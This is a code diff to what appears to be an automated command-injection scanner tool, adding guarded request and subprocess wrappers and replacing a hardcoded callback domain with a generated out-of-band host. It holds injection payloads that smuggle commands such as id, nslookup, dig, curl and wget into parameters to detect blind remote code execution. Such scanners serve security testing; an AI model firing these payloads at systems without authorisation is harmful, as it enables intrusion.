@@ -1,10 +1,10 @@
 import json
-import requests
+from core.tool_transport import guarded_requests as requests
 import re
 import time
 import urllib3
 from urllib.parse import quote, urlparse
-from langchain.tools import tool
+from core.tool_decorator import langchain_tool as tool
 from core.rate_limiter import rate_limiter
 from core.auth_store import auth_get, auth_post
 from core.cancellation import check_cancelled
@@ -56,7 +56,7 @@ def command_injection_scanner(url: str, params: str = "") -> str:
         Run commix sebagai confirmation step for command injection.
         Return dict with is_confirmed, evidence, severity.
         """
-        import subprocess
+        from core.tool_transport import guarded_subprocess as subprocess
         import tempfile
         import os
 
@@ -176,6 +176,8 @@ def command_injection_scanner(url: str, params: str = "") -> str:
 
     # ── COMPREHENSIVE COMMAND INJECTION PAYLOADS ──────────────────────────────
     # (payload, detection_type, expected_indicator, encoding)
+    oob_callback = oob_engine.generate_url("cmdi")
+    oob_host = oob_callback.split("://", 1)[-1].split("/", 1)[0]
     payloads = [
         # ── OUTPUT-BASED (Linux) ───────────────────────────────────────────────
         (";id", "output", ["uid=", "gid=", "groups="]),
@@ -294,20 +296,20 @@ def command_injection_scanner(url: str, params: str = "") -> str:
         (";tclsh <<< 'puts [exec id]'", "output", ["uid=", "gid="]),
 
         # ── BLIND RCE VIA DNS (OOB) ───────────────────────────────────────────
-        (";nslookup ssrf-test.whoopbhapzham.my.id", "oob", []),
-        ("|nslookup ssrf-test.whoopbhapzham.my.id", "oob", []),
-        ("&&nslookup ssrf-test.whoopbhapzham.my.id", "oob", []),
-        ("||nslookup ssrf-test.whoopbhapzham.my.id", "oob", []),
-        ("$(nslookup ssrf-test.whoopbhapzham.my.id)", "oob", []),
-        ("`nslookup ssrf-test.whoopbhapzham.my.id`", "oob", []),
-        (";dig ssrf-test.whoopbhapzham.my.id", "oob", []),
-        ("|dig ssrf-test.whoopbhapzham.my.id", "oob", []),
-        (";host ssrf-test.whoopbhapzham.my.id", "oob", []),
-        ("|host ssrf-test.whoopbhapzham.my.id", "oob", []),
-        (";curl ssrf-test.whoopbhapzham.my.id", "oob", []),
-        ("|curl ssrf-test.whoopbhapzham.my.id", "oob", []),
-        (";wget ssrf-test.whoopbhapzham.my.id", "oob", []),
-        ("|wget ssrf-test.whoopbhapzham.my.id", "oob", []),
+        (f";nslookup {oob_host}", "oob", []),
+        (f"|nslookup {oob_host}", "oob", []),
+        (f"&&nslookup {oob_host}", "oob", []),
+        (f"||nslookup {oob_host}", "oob", []),
+        (f"$(nslookup {oob_host})", "oob", []),
+        (f"`nslookup {oob_host}`", "oob", []),
+        (f";dig {oob_host}", "oob", []),
+        (f"|dig {oob_host}", "oob", []),
+        (f";host {oob_host}", "oob", []),
+        (f"|host {oob_host}", "oob", []),
+        (f";curl {oob_host}", "oob", []),
+        (f"|curl {oob_host}", "oob", []),
+        (f";wget {oob_host}", "oob", []),
+        (f"|wget {oob_host}", "oob", []),
     ]
 
     vulnerabilities = []
